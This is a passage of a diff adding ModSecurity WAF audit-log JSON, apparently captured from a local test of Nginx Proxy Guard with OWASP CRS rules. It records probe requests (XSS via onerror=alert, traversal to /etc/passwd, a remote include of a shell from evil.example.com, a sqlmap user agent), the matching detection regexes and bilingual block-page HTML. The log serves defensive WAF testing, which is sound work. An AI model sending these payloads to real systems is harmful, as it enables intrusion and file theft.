+            "match": "Matched \"Operator `Rx' with parameter `(?i)\\b(?:eval|set(?:timeout|interval)|new[\\s\\x0b]+Function|a(?:lert|tob)|btoa|(?:promp|impor)t|con(?:firm|sole\\.(?:log|dir))|fetch)[\\s\\x0b]*[\\(\\{]' against variable `ARGS:msg' (Value: `<img src=x onerror=alert(1)>' )",
+            "reference": "o19,6v10,28t:htmlEntityDecode,t:jsDecode",
+            "ruleId": "941390",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf",
+            "lineNumber": "816",
+            "data": "Matched Data: alert( found within ARGS:msg: <img src=x onerror=alert(1)>",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-multi",
+              "platform-nodejs",
+              "attack-xss",
+              "xss-perf-disable",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/ATTACK-XSS",
+              "capec/1000/152/242"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "Inbound Anomaly Score Exceeded (Total Score: 20)",
+          "details": {
+            "match": "Matched \"Operator `Ge' with parameter `5' against variable `TX:BLOCKING_INBOUND_ANOMALY_SCORE' (Value: `20' )",
+            "reference": "",
+            "ruleId": "949110",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf",
+            "lineNumber": "222",
+            "data": "",
+            "severity": "0",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "anomaly-evaluation",
+              "OWASP_CRS"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "transaction": {
+      "client_ip": "127.0.0.1",
+      "time_stamp": "Tue May 19 09:49:07 2026",
+      "server_id": "e1106931d470ef55c6eb2c64a76a4efb9068a9cf",
+      "client_port": 34740,
+      "host_ip": "127.0.0.1",
+      "host_port": 18080,
+      "unique_id": "177918414718.199178",
+      "is_interrupted": true,
+      "request": {
+        "method": "GET",
+        "http_version": "1.1",
+        "hostname": "modsec-capture-3192558-1779184145.local",
+        "uri": "/?file=../../../../etc/passwd",
+        "headers": {
+          "Host": "modsec-capture-3192558-1779184145.local",
+          "Accept": "*/*",
+          "User-Agent": "modsec-capture/1.0"
+        }
+      },
+      "response": {
+        "body": "<!DOCTYPE html>\n<html lang=\"ko\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>403 - Nginx Proxy Guard</title>\n    <link rel=\"icon\" type=\"image/x-icon\" href=\"/favicon.ico\">\n    <!-- Google Fonts -->\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n    <link href=\"https://fonts.googleapis.com/css2?family=Gowun+Batang&family=Inter&family=Noto+Sans+KR&display=swap\" rel=\"stylesheet\">\n    <!-- Pretendard from CDN -->\n    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/gh/orioncactus/pretendard@v1.3.9/dist/web/static/pretendard.min.css\">\n    <style>\n        :root {\n            --font-system: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Malgun Gothic', '맑은 고딕', sans-serif;\n            --font-gowun-batang: 'Gowun Batang', serif;\n            --font-noto-sans-kr: 'Noto Sans KR', sans-serif;\n            --font-pretendard: 'Pretendard', sans-serif;\n            --font-inter: 'Inter', sans-serif;\n            --current-font: var(--font-system);\n        }\n\n        * { margin: 0; padding: 0; box-sizing: border-box; }\n        body {\n            font-family: var(--current-font);\n            background: linear-gradient(135deg, #1e1e2e 0%, #2d2d44 100%);\n            min-height: 100vh;\n            display: flex;\n            align-items: center;\n            justify-content: center;\n            color: #e0e0e0;\n        }\n\n        body[data-font=\"gowun-batang\"] { --current-font: var(--font-gowun-batang); }\n        body[data-font=\"noto-sans-kr\"] { --current-font: var(--font-noto-sans-kr); }\n        body[data-font=\"pretendard\"] { --current-font: var(--font-pretendard); }\n        body[data-font=\"inter\"] { --current-font: var(--font-inter); }\n        .container { text-align: center; padding: 40px; max-width: 600px; }\n        .shield {\n            width: 120px; height: 120px; margin: 0 auto 30px; position: relative;\n        }\n        .shield svg {\n            width: 100%; height: 100%;\n            filter: drop-shadow(0 10px 30px rgba(239, 68, 68, 0.3));\n        }\n        .shield-icon { fill: #ef4444; animation: pulse 2s infinite; }\n        @keyframes pulse {\n            0%, 100% { opacity: 1; }\n            50% { opacity: 0.7; }\n        }\n        .error-code {\n            font-size: 72px; font-weight: 800;\n            background: linear-gradient(135deg, #ef4444 0%, #f97316 100%);\n            -webkit-background-clip: text; -webkit-text-fill-color: transparent;\n            background-clip: text; margin-bottom: 10px; letter-spacing: -2px;\n        }\n        .error-title { font-size: 28px; font-weight: 600; color: #f0f0f0; margin-bottom: 20px; }\n        .error-message { font-size: 16px; color: #a0a0a0; line-height: 1.8; margin-bottom: 30px; }\n        .security-badge {\n            display: inline-flex; align-items: center; gap: 8px;\n            padding: 12px 24px; background: rgba(239, 68, 68, 0.1);\n            border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 50px;\n            color: #ef4444; font-size: 14px; font-weight: 500;\n        }\n        .security-badge svg { width: 18px; height: 18px; }\n        .info-box {\n            margin-top: 40px; padding: 20px; background: rgba(255, 255, 255, 0.03);\n            border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.05);\n        }\n        .info-title {\n            font-size: 14px; font-weight: 600; color: #808080;\n            margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px;\n        }\n        .info-text { font-size: 14px; color: #707070; line-height: 1.6; }\n        .back-btn {\n            display: inline-block; margin-top: 30px; padding: 12px 30px;\n            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);\n            color: white; text-decoration: none; border-radius: 8px;\n            font-weight: 500; transition: transform 0.2s, box-shadow 0.2s;\n            cursor: pointer; border: none;\n        }\n        .back-btn:hover {\n            transform: translateY(-2px);\n            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.3);\n        }\n        .footer { margin-top: 50px; font-size: 12px; color: #505050; }\n        .footer a { color: #707070; text-decoration: none; }\n        .lang-switch {\n            margin-top: 20px; display: flex; justify-content: center; gap: 10px;\n        }\n        .lang-btn {\n            padding: 6px 16px; border-radius: 20px; border: 1px solid #404050;\n            background: transparent; color: #808080; font-size: 12px;\n            cursor: pointer; transition: all 0.2s;\n        }\n        .lang-btn:hover { border-color: #606070; color: #a0a0a0; }\n        .lang-btn.active {\n            background: rgba(59, 130, 246, 0.2); border-color: #3b82f6;\n            color: #3b82f6;\n        }\n        [data-lang=\"en\"] { display: none; }\n        body.en [data-lang=\"ko\"] { display: none; }\n        body.en [data-lang=\"en\"] { display: block; }\n        body.en .error-message[data-lang=\"en\"],\n        body.en .info-text[data-lang=\"en\"] { display: block; }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"shield\">\n            <svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n                <path class=\"shield-icon\" d=\"M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V8.26l7-3.89v8.62z\"/>\n                <path fill=\"#fff\" opacity=\"0.3\" d=\"M12 12.99V21c-3.72-1.15-6.47-4.82-7-8.94h7z\"/>\n                <line x1=\"8\" y1=\"10\" x2=\"16\" y2=\"10\" stroke=\"#fff\" stroke-width=\"2\" stroke-linecap=\"round\"/>\n                <line x1=\"12\" y1=\"6\" x2=\"12\" y2=\"14\" stroke=\"#fff\" stroke-width=\"2\" stroke-linecap=\"round\"/>\n            </svg>\n        </div>\n\n        <div class=\"error-code\">403</div>\n\n        <div class=\"error-title\" data-lang=\"ko\">접근이 차단되었습니다</div>\n        <div class=\"error-title\" data-lang=\"en\">Access Blocked</div>\n\n        <div class=\"error-message\" data-lang=\"ko\">\n            보안 정책에 의해 요청이 차단되었습니다.<br>\n            이 보안 조치는 잠재적으로 유해한 요청으로부터 시스템을 보호합니다.\n        </div>\n        <div class=\"error-message\" data-lang=\"en\">\n            Your request has been blocked by the security policy.<br>\n            This security measure protects the system from potentially harmful requests.\n        </div>\n\n        <div class=\"security-badge\">\n            <svg viewBox=\"0 0 24 24\" fill=\"currentColor\">\n                <path d=\"M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z\"/>\n            </svg>\n            <span data-lang=\"ko\">Nginx Proxy Guard 보안 보호</span>\n            <span data-lang=\"en\">Protected by Nginx Proxy Guard</span>\n        </div>\n\n        <div class=\"info-box\">\n            <div class=\"info-title\" data-lang=\"ko\">왜 차단되었나요?</div>\n            <div class=\"info-title\" data-lang=\"en\">Why was I blocked?</div>\n            <div class=\"info-text\" data-lang=\"ko\">\n                요청에 알려진 공격 패턴(SQL 인젝션, XSS, 경로 탐색 등)과 일치하는<br>\n                내용이 포함되어 있습니다. 오류라고 생각되시면 관리자에게 문의해 주세요.\n            </div>\n            <div class=\"info-text\" data-lang=\"en\">\n                The request contained patterns that match known attack signatures<br>\n                (SQL injection, XSS, path traversal, etc.). Contact the administrator if you believe this is a mistake.\n            </div>\n        </div>\n\n        <button class=\"back-btn\" onclick=\"history.back()\">\n            <span data-lang=\"ko\">뒤로 가기</span>\n            <span data-lang=\"en\">Go Back</span>\n        </button>\n\n        <div class=\"footer\">\n            Powered by <a href=\"#\">Nginx Proxy Guard</a>\n        </div>\n\n        <div class=\"lang-switch\">\n            <button class=\"lang-btn active\" onclick=\"setLang('ko')\" id=\"btn-ko\">한국어</button>\n            <button class=\"lang-btn\" onclick=\"setLang('en')\" id=\"btn-en\">English</button>\n        </div>\n    </div>\n\n    <script>\n        function applyLang(lang) {\n            document.documentElement.lang = lang;\n            document.body.className = lang === 'en' ? 'en' : '';\n            document.getElementById('btn-ko').className = 'lang-btn' + (lang === 'ko' ? ' active' : '');\n            document.getElementById('btn-en').className = 'lang-btn' + (lang === 'en' ? ' active' : '');\n        }\n        function setLang(lang) {\n            localStorage.setItem('npg_language', lang);\n            applyLang(lang);\n        }\n        function detectBrowserLang() {\n            var browserLang = (navigator.language || 'en').split('-')[0];\n            return browserLang === 'ko' ? 'ko' : 'en';\n        }\n        // Initial lang resolution (before API):\n        // 1) Prefer the user's saved click — UI Settings writes 'npg_language'; legacy 'npg_lang' kept for back-compat\n        // 2) Else follow browser language\n        // This avoids the Korean flash for non-Korean visitors with no saved preference.\n        var savedLang = localStorage.getItem('npg_language') || localStorage.getItem('npg_lang');\n        var initialLang = (savedLang === 'ko' || savedLang === 'en') ? savedLang : detectBrowserLang();\n        applyLang(initialLang);\n\n        // Load global UI settings (font + admin-configured default error page language)\n        async function loadUISettings() {\n            try {\n                const res = await fetch('/api/v1/public/ui-settings');\n                if (res.ok) {\n                    const data = await res.json();\n                    if (data.font_family && data.font_family !== 'system') {\n                        document.body.setAttribute('data-font', data.font_family);\n                    }\n                    // Admin default only applies when the visitor has no saved preference.\n                    // 'auto' (or missing) means follow browser language.\n                    if (savedLang !== 'ko' && savedLang !== 'en') {\n                        var adminDefault = data.error_page_language;\n                        if (adminDefault === 'ko' || adminDefault === 'en') {\n                            applyLang(adminDefault);\n                        }\n                        // else 'auto' → keep the browser-detected lang already applied.\n                    }\n                    return;\n                }\n            } catch (e) {\n                // API unavailable — fall back to saved font preference if any\n                var savedFont = localStorage.getItem('npg_font_family');\n                if (savedFont && savedFont !== 'system') {\n                    document.body.setAttribute('data-font', savedFont);\n                }\n            }\n        }\n        loadUISettings();\n    </script>\n</body>\n</html>\n",
+        "http_code": 403,
+        "headers": {
+          "X-Frame-Options": "SAMEORIGIN",
+          "ETag": "\"6a0c26a2-2a79\"",
+          "Last-Modified": "Tue, 19 May 2026 09:00:18 GMT",
+          "Vary": "Accept-Encoding",
+          "X-XSS-Protection": "1; mode=block",
+          "Connection": "keep-alive",
+          "X-Content-Type-Options": "nosniff",
+          "Content-Type": "text/html",
+          "Content-Length": "10873",
+          "Date": "Tue, 19 May 2026 09:49:07 GMT",
+          "Server": "nginx\u0000",
+          "Referrer-Policy": "strict-origin-when-cross-origin"
+        }
+      },
+      "producer": {
+        "modsecurity": "ModSecurity v3.0.15 (Linux)",
+        "connector": "ModSecurity-nginx v1.0.4",
+        "secrules_engine": "Enabled",
+        "components": [
+          "OWASP_CRS/4.26.0\""
+        ]
+      },
+      "messages": [
+        {
+          "message": "Path Traversal Attack (/../) or (/.../)",
+          "details": {
+            "match": "Matched \"Operator `Rx' with parameter `(?i)(?:[/\\x5c]|%(?:2(?:f|5(?:2f|5c|c(?:1%259c|0%25af))|%46)|5c|c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|(?:bg%q|(?:e|f(?:8%8)?0%8)0%80%a)f|u(?:221[56]|EFC8|F025|002f)|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|1 (394 characters omitted)' against variable `ARGS:file' (Value: `../../../../etc/passwd' )",
+            "reference": "o9,4v4,29o2,4v11,22",
+            "ruleId": "930100",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf",
+            "lineNumber": "35",
+            "data": "Matched Data: /../ found within ARGS:file: ../../../../etc/passwd",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-multi",
+              "platform-multi",
+              "attack-lfi",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/ATTACK-LFI",
+              "capec/1000/255/153/126"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "Path Traversal Attack (/../) or (/.../)",
+          "details": {
+            "match": "Matched \"Operator `Rx' with parameter `(?:^|[/;\\x5c])\\.{2,3}[/;\\x5c]' against variable `REQUEST_URI_RAW' (Value: `/?file=../../../../etc/passwd' )",
+            "reference": "o9,4v4,29",
+            "ruleId": "930110",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf",
+            "lineNumber": "73",
+            "data": "Matched Data: /../ found within REQUEST_URI_RAW: /?file=../../../../etc/passwd",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-multi",
+              "platform-multi",
+              "attack-lfi",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/ATTACK-LFI",
+              "capec/1000/255/153/126"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "Path Traversal Attack (/../) or (/.../)",
+          "details": {
+            "match": "Matched \"Operator `Rx' with parameter `(?:^|[/;\\x5c])\\.{2,3}[/;\\x5c]' against variable `ARGS:file' (Value: `../../../../etc/passwd' )",
+            "reference": "o0,3v11,22",
+            "ruleId": "930110",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf",
+            "lineNumber": "73",
+            "data": "Matched Data: ../ found within ARGS:file: ../../../../etc/passwd",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-multi",
+              "platform-multi",
+              "attack-lfi",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/ATTACK-LFI",
+              "capec/1000/255/153/126"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "OS File Access Attempt",
+          "details": {
+            "match": "Matched \"Operator `PmFromFile' with parameter `lfi-os-files.data' against variable `ARGS:file' (Value: `../../../../etc/passwd' )",
+            "reference": "o12,10v11,22t:utf8toUnicode,t:urlDecodeUni,t:normalizePathWin",
+            "ruleId": "930120",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf",
+            "lineNumber": "104",
+            "data": "Matched Data: etc/passwd found within ARGS:file: ../../../../etc/passwd",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-multi",
+              "platform-multi",
+              "attack-lfi",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/ATTACK-LFI",
+              "capec/1000/255/153/126"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "Remote Command Execution: Unix Shell Code Found",
+          "details": {
+            "match": "Matched \"Operator `PmFromFile' with parameter `unix-shell.data' against variable `ARGS:file' (Value: `../../../../etc/passwd' )",
+            "reference": "o12,10v11,22t:cmdLine,t:normalizePath",
+            "ruleId": "932160",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf",
+            "lineNumber": "706",
+            "data": "Matched Data: etc/passwd found within ARGS:file: ../../../../etc/passwd",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-shell",
+              "platform-unix",
+              "attack-rce",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/ATTACK-RCE",
+              "capec/1000/152/248/88"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "Inbound Anomaly Score Exceeded (Total Score: 30)",
+          "details": {
+            "match": "Matched \"Operator `Ge' with parameter `5' against variable `TX:BLOCKING_INBOUND_ANOMALY_SCORE' (Value: `30' )",
+            "reference": "",
+            "ruleId": "949110",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf",
+            "lineNumber": "222",
+            "data": "",
+            "severity": "0",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "anomaly-evaluation",
+              "OWASP_CRS"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "transaction": {
+      "client_ip": "127.0.0.1",
+      "time_stamp": "Tue May 19 09:49:07 2026",
+      "server_id": "e1106931d470ef55c6eb2c64a76a4efb9068a9cf",
+      "client_port": 34744,
+      "host_ip": "127.0.0.1",
+      "host_port": 18080,
+      "unique_id": "177918414796.464769",
+      "is_interrupted": false,
+      "request": {
+        "method": "GET",
+        "http_version": "1.1",
+        "hostname": "modsec-capture-3192558-1779184145.local",
+        "uri": "/?include=http://evil.example.com/shell.txt",
+        "headers": {
+          "Host": "modsec-capture-3192558-1779184145.local",
+          "Accept": "*/*",
+          "User-Agent": "modsec-capture/1.0"
+        }
+      },
+      "response": {
+        "body": "<!DOCTYPE html>\n<html lang=\"ko\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>502 - Nginx Proxy Guard</title>\n    <link rel=\"icon\" type=\"image/x-icon\" href=\"/favicon.ico\">\n    <style>\n        * { margin: 0; padding: 0; box-sizing: border-box; }\n        body {\n            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Malgun Gothic', '맑은 고딕', sans-serif;\n            background: linear-gradient(135deg, #1e1e2e 0%, #2d2d44 100%);\n            min-height: 100vh;\n            display: flex;\n            align-items: center;\n            justify-content: center;\n            color: #e0e0e0;\n        }\n        .container { text-align: center; padding: 40px; max-width: 600px; }\n        .icon {\n            width: 120px; height: 120px; margin: 0 auto 30px;\n            background: rgba(245, 158, 11, 0.1);\n            border-radius: 50%;\n            display: flex; align-items: center; justify-content: center;\n        }\n        .icon svg { width: 60px; height: 60px; }\n        .error-code {\n            font-size: 72px; font-weight: 800;\n            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);\n            -webkit-background-clip: text; -webkit-text-fill-color: transparent;\n            margin-bottom: 10px; letter-spacing: -2px;\n        }\n        .error-title { font-size: 28px; font-weight: 600; color: #f0f0f0; margin-bottom: 20px; }\n        .error-message { font-size: 16px; color: #a0a0a0; line-height: 1.8; margin-bottom: 30px; }\n        .status-badge {\n            display: inline-flex; align-items: center; gap: 8px;\n            padding: 12px 24px; background: rgba(245, 158, 11, 0.1);\n            border: 1px solid rgba(245, 158, 11, 0.3); border-radius: 50px;\n            color: #f59e0b; font-size: 14px; font-weight: 500;\n        }\n        .info-box {\n            margin-top: 40px; padding: 20px; background: rgba(255, 255, 255, 0.03);\n            border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.05);\n        }\n        .info-title { font-size: 14px; font-weight: 600; color: #808080; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; }\n        .info-text { font-size: 14px; color: #707070; line-height: 1.6; }\n        .retry-btn {\n            display: inline-block; margin-top: 30px; padding: 12px 30px;\n            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);\n            color: white; text-decoration: none; border-radius: 8px;\n            font-weight: 500; cursor: pointer; border: none;\n            transition: transform 0.2s, box-shadow 0.2s;\n        }\n        .retry-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(59, 130, 246, 0.3); }\n        .footer { margin-top: 50px; font-size: 12px; color: #505050; }\n        .footer a { color: #707070; text-decoration: none; }\n        .lang-switch {\n            margin-top: 20px; display: flex; justify-content: center; gap: 10px;\n        }\n        .lang-btn {\n            padding: 6px 16px; border-radius: 20px; border: 1px solid #404050;\n            background: transparent; color: #808080; font-size: 12px;\n            cursor: pointer; transition: all 0.2s;\n        }\n        .lang-btn:hover { border-color: #606070; color: #a0a0a0; }\n        .lang-btn.active {\n            background: rgba(59, 130, 246, 0.2); border-color: #3b82f6;\n            color: #3b82f6;\n        }\n        [data-lang=\"en\"] { display: none; }\n        body.en [data-lang=\"ko\"] { display: none; }\n        body.en [data-lang=\"en\"] { display: block; }\n        body.en .error-message[data-lang=\"en\"],\n        body.en .info-text[data-lang=\"en\"] { display: block; }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"icon\">\n            <svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"#f59e0b\" stroke-width=\"2\">\n                <path d=\"M22 12h-4l-3 9L9 3l-3 9H2\"/>\n            </svg>\n        </div>\n        <div class=\"error-code\">502</div>\n\n        <div class=\"error-title\" data-lang=\"ko\">연결 오류</div>\n        <div class=\"error-title\" data-lang=\"en\">Bad Gateway</div>\n\n        <div class=\"error-message\" data-lang=\"ko\">\n            서버로부터 유효하지 않은 응답을 받았습니다.<br>\n            백엔드 서비스가 일시적으로 사용 불가능한 상태입니다.\n        </div>\n        <div class=\"error-message\" data-lang=\"en\">\n            Received an invalid response from the upstream server.<br>\n            The backend service is temporarily unavailable.\n        </div>\n\n        <div class=\"status-badge\">\n            <svg width=\"18\" height=\"18\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\">\n                <circle cx=\"12\" cy=\"12\" r=\"10\"/>\n                <path d=\"M12 8v4M12 16h.01\"/>\n            </svg>\n            <span data-lang=\"ko\">업스트림 연결 실패</span>\n            <span data-lang=\"en\">Upstream Connection Failed</span>\n        </div>\n\n        <div class=\"info-box\">\n            <div class=\"info-title\" data-lang=\"ko\">어떻게 해야 하나요?</div>\n            <div class=\"info-title\" data-lang=\"en\">What should I do?</div>\n            <div class=\"info-text\" data-lang=\"ko\">\n                잠시 후 다시 시도해 주세요. 문제가 지속되면<br>\n                관리자에게 문의해 주시기 바랍니다.\n            </div>\n            <div class=\"info-text\" data-lang=\"en\">\n                Please try again in a few moments.<br>\n                If the problem persists, contact the administrator.\n            </div>\n        </div>\n\n        <button class=\"retry-btn\" onclick=\"location.reload()\">\n            <span data-lang=\"ko\">다시 시도</span>\n            <span data-lang=\"en\">Retry</span>\n        </button>\n\n        <div class=\"footer\">\n            Powered by <a href=\"#\">Nginx Proxy Guard</a>\n        </div>\n\n        <div class=\"lang-switch\">\n            <button class=\"lang-btn active\" onclick=\"setLang('ko')\" id=\"btn-ko\">한국어</button>\n            <button class=\"lang-btn\" onclick=\"setLang('en')\" id=\"btn-en\">English</button>\n        </div>\n    </div>\n\n    <script>\n        function applyLang(lang) {\n            document.documentElement.lang = lang;\n            document.body.className = lang === 'en' ? 'en' : '';\n            document.getElementById('btn-ko').className = 'lang-btn' + (lang === 'ko' ? ' active' : '');\n            document.getElementById('btn-en').className = 'lang-btn' + (lang === 'en' ? ' active' : '');\n        }\n        function setLang(lang) {\n            localStorage.setItem('npg_language', lang);\n            applyLang(lang);\n        }\n        function detectBrowserLang() {\n            var browserLang = (navigator.language || 'en').split('-')[0];\n            return browserLang === 'ko' ? 'ko' : 'en';\n        }\n        // Initial lang resolution (before API):\n        // 1) Prefer the user's saved click — UI Settings writes 'npg_language'; legacy 'npg_lang' kept for back-compat\n        // 2) Else follow browser language (default EN for non-Korean visitors)\n        // This avoids the Korean flash for non-Korean visitors with no saved preference.\n        var savedLang = localStorage.getItem('npg_language') || localStorage.getItem('npg_lang');\n        var initialLang = (savedLang === 'ko' || savedLang === 'en') ? savedLang : detectBrowserLang();\n        applyLang(initialLang);\n\n        // Load admin-configured default error page language. Only applies when\n        // the visitor has no saved preference; 'auto' (or missing) keeps the\n        // browser-detected lang.\n        async function loadDefaultLanguage() {\n            try {\n                const res = await fetch('/api/v1/public/ui-settings');\n                if (!res.ok) return;\n                const data = await res.json();\n                if (savedLang !== 'ko' && savedLang !== 'en') {\n                    var adminDefault = data.error_page_language;\n                    if (adminDefault === 'ko' || adminDefault === 'en') {\n                        applyLang(adminDefault);\n                    }\n                }\n            } catch (e) {\n                // API unavailable — keep the browser-detected lang already applied.\n            }\n        }\n        loadDefaultLanguage();\n    </script>\n</body>\n</html>\n",
+        "http_code": 502,
+        "headers": {
+          "X-Frame-Options": "SAMEORIGIN",
+          "ETag": "\"6a0c26a2-2057\"",
+          "Last-Modified": "Tue, 19 May 2026 09:00:18 GMT",
+          "Vary": "Accept-Encoding",
+          "X-XSS-Protection": "1; mode=block",
+          "Connection": "keep-alive",
+          "X-Content-Type-Options": "nosniff",
+          "Content-Type": "text/html",
+          "Content-Length": "8279",
+          "Date": "Tue, 19 May 2026 09:49:07 GMT",
+          "Server": "nginx\u0000",
+          "Referrer-Policy": "strict-origin-when-cross-origin"
+        }
+      },
+      "producer": {
+        "modsecurity": "ModSecurity v3.0.15 (Linux)",
+        "connector": "ModSecurity-nginx v1.0.4",
+        "secrules_engine": "Enabled",
+        "components": [
+          "OWASP_CRS/4.26.0\""
+        ]
+      },
+      "messages": []
+    }
+  },
+  {
+    "transaction": {
+      "client_ip": "127.0.0.1",
+      "time_stamp": "Tue May 19 09:49:07 2026",
+      "server_id": "e1106931d470ef55c6eb2c64a76a4efb9068a9cf",
+      "client_port": 34754,
+      "host_ip": "127.0.0.1",
+      "host_port": 18080,
+      "unique_id": "177918414785.987183",
+      "is_interrupted": true,
+      "request": {
+        "method": "GET",
+        "http_version": "1.1",
+        "hostname": "modsec-capture-3192558-1779184145.local",
+        "uri": "/",
+        "headers": {
+          "Host": "modsec-capture-3192558-1779184145.local",
+          "Accept": "*/*",
+          "User-Agent": "sqlmap/1.5.2#stable"
+        }
+      },
+      "response": {
+        "body": "<!DOCTYPE html>\n<html lang=\"ko\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>403 - Nginx Proxy Guard</title>\n    <link rel=\"icon\" type=\"image/x-icon\" href=\"/favicon.ico\">\n    <!-- Google Fonts -->\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n    <link href=\"https://fonts.googleapis.com/css2?family=Gowun+Batang&family=Inter&family=Noto+Sans+KR&display=swap\" rel=\"stylesheet\">\n    <!-- Pretendard from CDN -->\n    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/gh/orioncactus/pretendard@v1.3.9/dist/web/static/pretendard.min.css\">\n    <style>\n        :root {\n            --font-system: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Malgun Gothic', '맑은 고딕', sans-serif;\n            --font-gowun-batang: 'Gowun Batang', serif;\n            --font-noto-sans-kr: 'Noto Sans KR', sans-serif;\n            --font-pretendard: 'Pretendard', sans-serif;\n            --font-inter: 'Inter', sans-serif;\n            --current-font: var(--font-system);\n        }\n\n        * { margin: 0; padding: 0; box-sizing: border-box; }\n        body {\n            font-family: var(--current-font);\n            background: linear-gradient(135deg, #1e1e2e 0%, #2d2d44 100%);\n            min-height: 100vh;\n            display: flex;\n            align-items: center;\n            justify-content: center;\n            color: #e0e0e0;\n        }\n\n        body[data-font=\"gowun-batang\"] { --current-font: var(--font-gowun-batang); }\n        body[data-font=\"noto-sans-kr\"] { --current-font: var(--font-noto-sans-kr); }\n        body[data-font=\"pretendard\"] { --current-font: var(--font-pretendard); }\n        body[data-font=\"inter\"] { --current-font: var(--font-inter); }\n        .container { text-align: center; padding: 40px; max-width: 600px; }\n        .shield {\n            width: 120px; height: 120px; margin: 0 auto 30px; position: relative;\n        }\n        .shield svg {\n            width: 100%; height: 100%;\n            filter: drop-shadow(0 10px 30px rgba(239, 68, 68, 0.3));\n        }\n        .shield-icon { fill: #ef4444; animation: pulse 2s infinite; }\n        @keyframes pulse {\n            0%, 100% { opacity: 1; }\n            50% { opacity: 0.7; }\n        }\n        .error-code {\n            font-size: 72px; font-weight: 800;\n            background: linear-gradient(135deg, #ef4444 0%, #f97316 100%);\n            -webkit-background-clip: text; -webkit-text-fill-color: transparent;\n            background-clip: text; margin-bottom: 10px; letter-spacing: -2px;\n        }\n        .error-title { font-size: 28px; font-weight: 600; color: #f0f0f0; 